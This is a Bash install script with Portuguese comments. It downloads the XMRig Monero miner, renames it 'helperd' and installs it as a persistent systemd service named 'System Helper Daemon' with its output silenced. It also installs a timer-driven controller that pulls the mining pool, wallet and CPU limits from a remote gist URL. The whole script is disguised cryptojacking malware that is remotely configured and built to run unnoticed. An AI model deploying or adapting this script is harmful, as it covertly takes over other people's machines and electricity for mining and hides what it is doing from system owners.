#!/usr/bin/env bash

########################################
# SAFE MODE
########################################
log() { echo "[system-helper][$(date +%H:%M:%S)] $*"; }

########################################
# CONSTANTES FIXAS
########################################
BASE_DIR="/var/lib/system-helper"
BIN_NAME="helperd"
SERVICE_NAME="system-helper"
CONF_FILE="$BASE_DIR/runtime.json"
STATE_FILE="$BASE_DIR/state.json"
METRICS_FILE="$BASE_DIR/metrics.prom"

CONFIG_URL="https://gist.githubusercontent.com/hgdexslnone/76d63764034f784aade73ac14766d8ae/raw/dc9a379faf7da1e48b015088337e57af403f0f8a/config.json"

########################################
# DEPENDÊNCIAS
########################################
log "Instalando dependências"
export DEBIAN_FRONTEND=noninteractive
apt update -y || true
apt install -y \
  curl jq bc tar \
  lm-sensors hwloc msr-tools \
  ca-certificates locales || {
    log "Falha ao instalar dependências"
    exit 1
  }

locale-gen en_US.UTF-8 >/dev/null 2>&1 || true
update-locale LANG=en_US.UTF-8 >/dev/null 2>&1 || true
sensors-detect --auto >/dev/null 2>&1 || true

########################################
# DIRETÓRIO BASE
########################################
log "Preparando diretório $BASE_DIR"
mkdir -p "$BASE_DIR" || exit 1
cd "$BASE_DIR" || exit 1

########################################
# DOWNLOAD DO BINÁRIO (JSON REAL VALIDADO)
########################################
log "Obtendo release do xmrig (linux-static-x64)"

XMRIG_URL="$(curl -fsSL \
  -H 'Accept: application/vnd.github+json' \
  -H 'User-Agent: system-helper' \
  --connect-timeout 5 --max-time 10 \
  https://api.github.com/repos/xmrig/xmrig/releases/latest \
  | jq -r '.assets[] | select(.name | test("linux-static-x64\\.tar\\.gz$")) | .browser_download_url' \
  | head -n1)"

if [ -z "$XMRIG_URL" ]; then
  log "ERRO CRÍTICO: asset linux-static-x64 não encontrado no release"
  exit 1
fi

log "Download: $XMRIG_URL"
curl -fL --connect-timeout 10 --max-time 60 \
  -o payload.tar.gz "$XMRIG_URL" || {
    log "Falha no download do binário"
    exit 1
  }

tar -xzf payload.tar.gz --strip-components=1 || exit 1
rm -f payload.tar.gz

mv xmrig "$BIN_NAME" || exit 1
chmod +x "$BIN_NAME"

########################################
# SYSTEMD SERVICE (NOME FIXO)
########################################
log "Criando serviço systemd: ${SERVICE_NAME}.service"

cat > "/etc/systemd/system/${SERVICE_NAME}.service" <<EOF
[Unit]
Description=System Helper Daemon
After=network-online.target

[Service]
ExecStart=$BASE_DIR/$BIN_NAME --config=$CONF_FILE --api-worker-id=$(hostname)
WorkingDirectory=$BASE_DIR
Restart=always
Nice=10
CPUQuota=25%
StandardOutput=null
StandardError=null

[Install]
WantedBy=multi-user.target
EOF

########################################
# SCRIPT DE CONTROLE
########################################
log "Criando controller.sh"

cat > "$BASE_DIR/controller.sh" <<'EOF'
#!/usr/bin/env bash

CONFIG_URL="__CONFIG_URL__"
SERVICE="system-helper"
BASE="/var/lib/system-helper"
CONF="$BASE/runtime.json"
STATE="$BASE/state.json"
METRICS="$BASE/metrics.prom"

CFG="$(curl -fsSL --connect-timeout 5 --max-time 10 "$CONFIG_URL")" || exit 0
[ -z "$CFG" ] && exit 0

ENABLED="$(jq -r .enabled <<<"$CFG")"
POOL="$(jq -r .pool <<<"$CFG")"
WALLET="$(jq -r .wallet <<<"$CFG")"
FACTOR="$(jq -r .min_hashrate_factor <<<"$CFG")"
DAY_CPU="$(jq -r .day_cpu <<<"$CFG")"
NIGHT_CPU="$(jq -r .night_cpu <<<"$CFG")"
MAX_CPU="$(jq -r .max_cpu <<<"$CFG")"

PORTS=($(jq -r '.ports[]' <<<"$CFG"))

# Cluster OFF
[ "$ENABLED" != "true" ] && systemctl stop "$SERVICE" && exit 0

# CPU por horário
HOUR="$(date +%H)"
CPU="$DAY_CPU"
[ "$HOUR" -ge 20 ] || [ "$HOUR" -lt 9 ] && CPU="$NIGHT_CPU"
[ "$CPU" -gt "$MAX_CPU" ] && CPU="$MAX_CPU"
systemctl set-property "$SERVICE" CPUQuota="${CPU}%"

best_hash=0
best_port=""

# Descoberta inicial (uma vez)
if [ ! -f "$STATE" ]; then
  for port in "${PORTS[@]}"; do
    cat > "$CONF" <<CONFJSON
{
  "autosave": true,
  "donate-level": 1,
  "api": { "id": null },
  "cpu": { "enabled": true, "huge-pages": true },
  "pools": [{
    "url": "$POOL:$port",
    "user": "$WALLET",
    "pass": "$(hostname)",
    "keepalive": true
  }]
}
CONFJSON

    systemctl restart "$SERVICE"
    sleep 25

    HASH="$(curl -s http://127.0.0.1:16000/1/summary | jq '.hashrate.total[0]' 2>/dev/null)"
    [ -z "$HASH" ] && HASH=0

    if [ "$HASH" -gt "$best_hash" ]; then
      best_hash="$HASH"
      best_port="$port"
    fi
  done

  echo "{\"best_port\":$best_port,\"best_hash\":$best_hash}" > "$STATE"
fi

BEST_PORT="$(jq -r .best_port "$STATE")"
BEST_HASH="$(jq -r .best_hash "$STATE")"

# Config final
cat > "$CONF" <<FINALJSON
{
  "autosave": true,
  "donate-level": 1,
  "api": { "id": null },
  "cpu": { "enabled": true, "huge-pages": true },
  "pools": [{
    "url": "$POOL:$BEST_PORT",
    "user": "$WALLET",
    "pass": "$(hostname)",
    "keepalive": true
  }]
}
FINALJSON

systemctl restart "$SERVICE"
sleep 20

CURRENT_HASH="$(curl -s http://127.0.0.1:16000/1/summary | jq '.hashrate.total[0]' 2>/dev/null)"
[ -z "$CURRENT_HASH" ] && CURRENT_HASH=0

MIN_ACCEPT="$(echo "$BEST_HASH * $FACTOR" | bc | cut -d. -f1)"
[ "$CURRENT_HASH" -lt "$MIN_ACCEPT" ] && rm -f "$STATE"

# Métricas Prometheus
cat <<MET > "$METRICS"
syshelper_hashrate $CURRENT_HASH
syshelper_best_hashrate $BEST_HASH
syshelper_port $BEST_PORT
syshelper_cpu_quota $CPU
MET
EOF

sed -i "s|__CONFIG_URL__|$CONFIG_URL|g" "$BASE_DIR/controller.sh"
chmod +x "$BASE_DIR/controller.sh"

########################################
# TIMER
########################################
log "Criando timer system-helper.timer"

cat > "/etc/systemd/system/${SERVICE_NAME}.timer" <<EOF
[Timer]
OnBootSec=2min
OnUnitActiveSec=5min
Persistent=true

[Install]
WantedBy=timers.target
EOF

########################################
# ATIVAÇÃO
########################################
log "Ativando serviços"
systemctl daemon-reexec
systemctl daemon-reload
systemctl enable "${SERVICE_NAME}.service" "${SERVICE_NAME}.timer"
systemctl start "${SERVICE_NAME}.service" "${SERVICE_NAME}.timer"

log "Instalação concluída"
log "Serviço criado: ${SERVICE_NAME}.service"
log "Base: $BASE_DIR"
